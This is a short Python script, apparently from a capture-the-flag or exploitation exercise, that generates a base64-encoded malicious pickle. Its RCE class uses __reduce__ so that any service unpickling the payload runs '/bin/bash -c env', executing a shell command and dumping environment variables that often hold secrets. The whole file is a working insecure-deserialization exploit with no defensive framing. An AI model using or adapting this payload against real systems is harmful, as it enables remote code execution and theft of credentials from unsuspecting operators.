import pickle
import base64


class RCE:
    def __reduce__(self):
        import subprocess
        return (subprocess.check_output, (['/bin/bash', '-c', 'env'],))


if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.b64encode(pickled).decode('ASCII'))
